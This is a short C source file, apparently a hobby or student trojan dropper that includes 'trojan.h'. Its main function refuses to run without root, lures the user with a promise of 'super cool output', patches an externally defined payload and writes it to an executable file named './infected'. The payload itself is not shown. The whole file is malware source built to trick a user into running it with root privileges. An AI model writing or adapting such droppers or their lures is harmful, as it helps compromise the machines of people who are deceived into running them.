#include "trojan.h"
#include <fcntl.h>

int main(void) {
	extern unsigned char payload[];
	extern unsigned int	 payload_len;

	if (getuid() != 0) {
		printf("Run me as root and check out a super cool output!\n");
		return (-1);
	}
	int fd = open("./infected", O_CREAT | O_TRUNC | O_WRONLY,
				  S_IWUSR | S_IXOTH | S_IXUSR | S_IXGRP | S_IXOTH);
	if (fd < 0) {
		printf("deu merda no open\n");
		return 0;
	}
	patch_payload(payload, payload_len);
	if (write(fd, payload, payload_len) < 0) {
		printf("write error for fd %d: %s\n", fd, strerror(errno));
	}
	printf("gsaiago\n");
}
